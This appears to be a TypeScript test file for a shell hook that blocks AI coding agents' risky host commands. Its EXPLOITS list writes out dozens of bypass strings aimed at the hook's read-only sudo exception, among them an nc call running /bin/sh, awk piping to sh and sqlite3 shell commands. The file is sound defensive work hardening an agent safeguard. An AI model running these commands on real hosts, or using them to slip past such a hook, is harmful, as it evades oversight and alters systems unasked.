// Tests for check-host-infra-safety.sh.
//
// Run: node --test --experimental-strip-types templates/agents/hooks/check-host-infra-safety.test.ts
//
// The hook stays bash (the harness fires it on every Bash call), so this suite
// SPAWNS it with `bash`, one payload on stdin per case. Two layers:
//   1. one representative payload per trigger (a)-(j), an allowed command and
//      the three no-command payloads, each in Claude Code's shape (exit 2 is a
//      refusal) and, for the commands, Antigravity's (a `deny` decision on
//      stdout, exit 0) — the contract each harness reads;
//   2. the hook's own `--self-test`, which runs every `block:` / `pass:` /
//      `raw:` example in its header plus the
//      systemd-unit fixtures a one-line example cannot place.
// Nothing here reads a live host: every payload is a command string the hook
// classifies, never runs.

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync } from "node:fs";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

const HOOK = join(dirname(fileURLToPath(import.meta.url)), "check-host-infra-safety.sh");
assert.ok(existsSync(HOOK), `hook not found at ${HOOK}`);

interface Run {
  rc: number;
  out: string;
  err: string;
}

function hook(stdin: string, ...args: string[]): Run {
  const res = spawnSync("bash", [HOOK, ...args], {
    input: stdin,
    encoding: "utf8",
  });
  return { rc: res.status ?? -1, out: res.stdout ?? "", err: res.stderr ?? "" };
}

const claude = (command: string): string => JSON.stringify({ tool_name: "Bash", tool_input: { command } });
const antigravity = (command: string): string =>
  JSON.stringify({
    toolCall: { name: "run_command", args: { CommandLine: command } },
    stepIdx: 0,
  });

// One command per trigger, each a case the header documents.
const REFUSED: [string, string][] = [
  ["(a) sudo over ssh, not read-only", 'ssh nas "sudo docker restart uptime-kuma"'],
  ["(b) a write under /etc/", "echo x > /etc/hosts"],
  ["(c) an ip route mutation", "ip route add 192.168.1.0/24 via 192.168.1.1"],
  [
    "(d) systemctl enable on a unit not under ~/.config/systemd/user",
    "systemctl --user enable definitely-not-installed.timer",
  ],
  ["(e) an edit to daemon.json", "vim /etc/docker/daemon.json"],
  ["(f) restarting a session-hosting service", "systemctl --user restart t3code"],
  ["(g) pkill -f", "pkill -f astro"],
  ["(h) pgrep -f feeding a kill", "pgrep -f 'myjob' | xargs -r kill"],
  ["(i) killing the session's own process name", "pkill -x claude"],
  ["(j) killing whatever holds a port", "fuser -k 8791/tcp"],
];

for (const [name, command] of REFUSED) {
  test(`refuses ${name}`, () => {
    const r = hook(claude(command));
    assert.equal(r.rc, 2, `expected exit 2 for: ${command}\n${r.out}${r.err}`);
    assert.match(r.err, /BLOCKED/, "the refusal names itself on stderr");
    assert.ok(r.err.includes(command), "the refusal quotes the command");
  });

  test(`refuses ${name} in Antigravity's shape`, () => {
    const r = hook(antigravity(command));
    assert.equal(r.rc, 0, `Antigravity reads stdout, not the exit code: ${r.err}`);
    const decision = JSON.parse(r.out) as {
      decision?: string;
      reason?: string;
    };
    assert.equal(decision.decision, "deny");
    assert.match(decision.reason ?? "", /BLOCKED/);
  });
}

test("(j)'s refusal names the shared-host collision and the process-group remedy", () => {
  const r = hook(claude("lsof -ti tcp:3000 | xargs -r kill"));
  assert.equal(r.rc, 2);
  assert.match(r.err, /shared host/);
  assert.match(r.err, /8791/);
  assert.match(r.err, /kill -- -"\$PGID"/);
});

test("the pkill -f refusal no longer recommends a kill by port", () => {
  // Its remedy once taught a kill by port, and the kills that followed it
  // landed on another service's port.
  const r = hook(claude("pkill -f astro"));
  assert.equal(r.rc, 2);
  assert.doesNotMatch(r.err, /fuser -k|lsof|by port/);
  assert.match(r.err, /kill -- -"\$PGID"/);
});

test("allows a read-only command in both shapes", () => {
  const command = "ip route show";
  let r = hook(claude(command));
  assert.equal(r.rc, 0, r.err);
  assert.equal(r.out, "");
  r = hook(antigravity(command));
  assert.equal(r.rc, 0, r.err);
  assert.equal(r.out, "", "silence is Antigravity's allow");
});

test("allows read-only diagnosis over ssh with sudo", () => {
  const r = hook(claude('ssh nas "sudo systemctl status docker --no-pager" 2>&1'));
  assert.equal(r.rc, 0, r.err);
});

test("host-change remedy preserves authorization already given in this session", () => {
  for (const payload of [
    claude('ssh nas "sudo docker restart uptime-kuma"'),
    antigravity('ssh nas "sudo docker restart uptime-kuma"'),
  ]) {
    const r = hook(payload);
    const message = r.out ? JSON.parse(r.out).reason : r.err;
    assert.match(message, /If this session does not already authorize this change,/);
    assert.match(message, /Reuse authorization already given; do not ask again\./);
    assert.match(message, /record the authorization as a comment/);
  }
});

test("session-host kill remedy preserves existing authorization and its recorded-script route", () => {
  for (const payload of [claude("pkill -x claude"), antigravity("pkill -x claude")]) {
    const r = hook(payload);
    const message = r.out ? JSON.parse(r.out).reason : r.err;
    assert.match(message, /If this session does not already authorize ending every session,/);
    assert.match(message, /use the Write tool to write/);
    assert.match(message, /Reuse authorization already given; do not ask again\./);
    assert.match(message, /record the authorization as a comment/);
    assert.match(message, /run the script/);
  }
});

test("passes a payload with no command: another tool, an empty command, an empty object", () => {
  for (const payload of [JSON.stringify({ tool_name: "Read" }), claude(""), "{}"]) {
    const r = hook(payload);
    assert.equal(r.rc, 0, `${payload}: ${r.err}`);
    assert.equal(r.out, "");
  }
});

test("malformed JSON is a hook error (exit 5 from jq), never a refusal", () => {
  // Exit 2 would refuse every command while the payload format is broken; any
  // other non-zero is a non-blocking hook error the harness shows and moves past.
  const r = hook("not json");
  assert.equal(r.rc, 5);
  assert.match(r.err, /jq: parse error/);
});

test("--self-test: every documented example and the unit fixtures", () => {
  const r = hook("", "--self-test");
  assert.equal(r.rc, 0, r.err);
  assert.match(r.out, /^self-test: pass=\d+ fail=0$/m);
});

// ── The read-only exception judges options, not just the command name ──────
//
// A pass list for sudo over ssh that trusts a command's NAME lets `sort -o`,
// `rg --pre`, `awk system()`, `date --set` and a container's `env <cmd>` /
// `sed --in-place` pass as "diagnosis". Every payload below is a string the hook classifies; none is run.
// Each family is covered directly and inside `docker exec`.
const EXPLOITS: [string, string][] = [
  ["sort output option", "ssh nas 'sudo sort -o /tmp/rule-proof /tmp/input'"],
  ["sort clustered output option", "ssh nas 'sudo sort -uo /tmp/rule-proof /tmp/input'"],
  ["sort long output option", "ssh nas 'sudo sort --output=/tmp/rule-proof /tmp/input'"],
  ["sort compress program", "ssh nas 'sudo sort --compress-program=touch /tmp/input'"],
  ["uniq output operand", "ssh nas 'sudo uniq /tmp/input /tmp/rule-proof'"],
  ["uniq output operand after a valued option", "ssh nas 'sudo uniq -f 1 /tmp/input /tmp/rule-proof'"],
  ["date clock setter", "ssh nas 'sudo date --set=2000-01-01'"],
  ["date short clock setter", "ssh nas 'sudo date -s 2000-01-01'"],
  ["hostname setter", "ssh nas 'sudo hostname rule-proof'"],
  ["hostname file setter", "ssh nas 'sudo hostname -F /tmp/input'"],
  ["ripgrep preprocessor", "ssh nas 'sudo rg --pre=touch rule-proof /tmp/input'"],
  ["ripgrep separate preprocessor", "ssh nas 'sudo rg --pre touch rule-proof /tmp/input'"],
  ["ripgrep hostname binary", "ssh nas 'sudo rg --hostname-bin=touch x /tmp/input'"],
  ["awk system call", "ssh nas 'sudo awk BEGIN{system(\"true\")}'"],
  ["awk print to a file after a separator", 'ssh nas \'sudo awk "BEGIN{x=1; print 1 > \\"/tmp/rule-proof\\"}"\''],
  ["awk pipe to a command", 'ssh nas "sudo awk \'BEGIN{print 1 | \\"sh\\"}\'"'],
  ["awk getline from a command", 'ssh nas "sudo awk \'BEGIN{\\"id\\" | getline x}\'"'],
  ["awk getline from a command across a line continuation", 'ssh nas "sudo awk \'BEGIN{\\"id\\" |\\\ngetline x}\'"'],
  ["awk program file", "ssh nas 'sudo awk -f /tmp/prog /tmp/input'"],
  ["awk indirect system call", 'ssh nas "sudo awk \'BEGIN{f=\\"system\\"; @f(\\"touch /tmp/rule-proof\\")}\'"'],
  [
    "awk indirect call with a space before the parenthesis",
    'ssh nas "sudo awk \'BEGIN{f=\\"system\\"; @f (\\"touch /tmp/rule-proof\\")}\'"',
  ],
  ["sed in place after -n", "ssh nas 'sudo sed -n -i s/a/b/ /tmp/input'"],
  ["sed write command", "ssh nas \"sudo sed -n 'w /tmp/rule-proof' /tmp/input\""],
  ["sed execute command", "ssh nas \"sudo sed -n '1e touch /tmp/rule-proof' /tmp/input\""],
  ["sed substitute with write flag", "ssh nas \"sudo sed -n 's/a/b/w /tmp/rule-proof' /tmp/input\""],
  ["sed write flag after another delimiter", "ssh nas \"sudo sed -n 's#a#b#w /tmp/rule-proof' /tmp/input\""],
  ["sed execute flag after another delimiter", "ssh nas \"sudo sed 's|a|b|e' /tmp/input\""],
  ["sed write flag after a hyphen delimiter", "ssh nas \"sudo sed -n 's-a-b-w /tmp/rule-proof' /tmp/input\""],
  [
    "sed write flag after escaped replacement text",
    "ssh nas \"sudo sed -n 's-a-b\\n-w /tmp/rule-proof' /tmp/input\"",
  ],
  ["date positional clock setter", "ssh nas 'sudo date 110212002026'"],
  ["date positional clock setter with seconds", "ssh nas 'sudo date 1102120026.30'"],
  ["file magic compiler", "ssh nas 'sudo file -C -m /tmp/magic'"],
  ["sqlite3 writefile", "ssh nas \"sudo sqlite3 -readonly /db \\\"SELECT writefile('/tmp/rule-proof', 'x');\\\"\""],
  ["sqlite3 shell dot-command", 'ssh nas "sudo sqlite3 -readonly -cmd \'.shell touch /tmp/x\' /db \\"SELECT 1;\\""'],
  ["smartctl long setter", "ssh nas 'sudo smartctl -a --smart=off /dev/sda'"],
  ["smartctl offline setter", "ssh nas 'sudo smartctl -a -o on /dev/sda'"],
  ["journalctl cursor file", "ssh nas 'sudo journalctl --cursor-file=/tmp/rule-proof -n 1'"],
  ["ipmitool sdr dump", "ssh nas 'sudo ipmitool sdr dump /tmp/rule-proof'"],
  ["pvecm cluster change", "ssh nas 'sudo pvecm expected 1'"],
  ["nvidia-smi power limit", "ssh nas 'sudo nvidia-smi -pl 100'"],
  ["nvidia-smi log file", "ssh nas 'sudo nvidia-smi -q -f /tmp/rule-proof'"],
  ["nc execute", "ssh nas 'sudo nc -z -e /bin/sh host 1'"],
  ["docker read verb as a trailing argument", "ssh nas 'sudo docker rm -f sample docker ps'"],
  ["container env command", "ssh nas 'sudo docker exec sample env touch /tmp/rule-proof'"],
  ["container long sed edit", "ssh nas 'sudo docker exec sample sed --in-place s/a/b/ /tmp/input'"],
  ["container short sed edit", "ssh nas 'sudo docker exec sample sed -i s/a/b/ /tmp/input'"],
  ["container sort output", "ssh nas 'sudo docker exec sample sort -o /tmp/rule-proof /tmp/input'"],
  ["container date setter", "ssh nas 'sudo docker exec sample date -s 2000-01-01'"],
  ["container awk system call", "ssh nas 'sudo docker exec sample awk BEGIN{system(\"true\")}'"],
  [
    "container awk indirect system call",
    'ssh nas "sudo docker exec sample awk \'BEGIN{f=\\"system\\"; @f(\\"true\\")}\'"',
  ],
  ["container wrapped command", "ssh nas 'sudo docker exec sample timeout 5 touch /tmp/rule-proof'"],
  ["container nested docker mutation", "ssh nas 'sudo docker exec sample docker restart other'"],
];

const CONTROLS: [string, string][] = [
  ["plain sort", "ssh nas 'sudo sort /tmp/input'"],
  ["sort with key options", "ssh nas 'sudo sort -k2 -t: -n /etc/passwd'"],
  ["uniq with one input", "ssh nas 'sudo uniq -c /tmp/input'"],
  ["uniq with a spaced stderr redirect", "ssh nas 'sudo uniq /tmp/input 2> /dev/null'"],
  ["date relative to now", "ssh nas \"sudo date -d '1 day ago' +%F\""],
  ["date displaying a numeric date", "ssh nas 'sudo date -d 20261102 +%F'"],
  ["sed print from a path holding /e", "ssh nas \"sudo sed -n 's/a/b/p' /var/log/error.log\""],
  ["sed replacement holding an escaped delimiter", "ssh nas \"sudo sed 's-a-b\\-w text-' /tmp/input\""],
  ["sed with an expression flag", "ssh nas \"sudo sed -e 's/a/b/' /tmp/input\""],
  ["plain hostname", "ssh nas 'sudo hostname'"],
  ["hostname read option", "ssh nas 'sudo hostname -I'"],
  ["date with a format", "ssh nas 'sudo date +%s'"],
  ["date iso seconds", "ssh nas 'sudo date -Iseconds'"],
  ["ripgrep search", "ssh nas 'sudo rg -n error /var/log/syslog'"],
  ["awk field print piped onward", "ssh nas \"sudo awk -F: '{print \\$1}' /etc/passwd | sort\""],
  ["awk reading a systemd unit file", "ssh nas \"sudo awk '{print \\$1}' /etc/systemd/system/example.service\""],
  ["awk matching the word system in a log", "ssh nas \"sudo awk '/system/ {print}' /var/log/syslog\""],
  ["awk reading a file with getline", "ssh nas \"sudo awk 'BEGIN{getline l < \\\"/etc/hostname\\\"; print l}'\""],
  ["sed print range", "ssh nas \"sudo sed -n '1,20p' /etc/fstab\""],
  ["sed print matching a word with w", "ssh nas \"sudo sed -n '/warn/p' /var/log/syslog\""],
  ["sqlite3 read-only select", 'ssh nas "sudo sqlite3 -readonly /db \\"SELECT id FROM monitor;\\""'],
  ["smartctl all", "ssh nas 'sudo smartctl -a /dev/sdc'"],
  ["journalctl recent", "ssh nas 'sudo journalctl -u docker -n 50 --no-pager'"],
  ["ipmitool sdr", "ssh nas 'sudo ipmitool sdr'"],
  ["nvidia-smi query", "ssh nas 'sudo nvidia-smi --query-gpu=name,memory.used --format=csv'"],
  ["pvecm status", "ssh nas 'sudo pvecm status'"],
  ["nc probe", "ssh nas 'sudo nc -z -w 2 host 22'"],
  ["docker ps", "ssh nas 'sudo docker ps'"],
  ["container text read", "ssh nas 'sudo docker exec sample cat /tmp/input'"],
  ["container env listing", "ssh nas 'sudo docker exec sample env'"],
  ["container sed print", "ssh nas 'sudo docker exec sample sed -n 1,5p /tmp/input'"],
  ["container grep", "ssh nas \"sudo docker exec uptime-kuma grep -n 'heartbeat' /app/server/model/monitor.js\""],
  ["container read-only sqlite3", 'ssh nas "sudo docker exec kuma sqlite3 -readonly /db \\"SELECT 1;\\""'],
];

for (const [name, command] of EXPLOITS) {
  test(`read exception refuses: ${name}`, () => {
    const r = hook(claude(command));
    assert.equal(r.rc, 2, `expected a refusal for: ${command}\n${r.err}`);
    assert.match(r.err, /sudo over ssh/);
  });
}

for (const [name, command] of CONTROLS) {
  test(`read exception still allows: ${name}`, () => {
    const r = hook(claude(command));
    assert.equal(r.rc, 0, `expected a pass for: ${command}\n${r.err}`);
  });
}
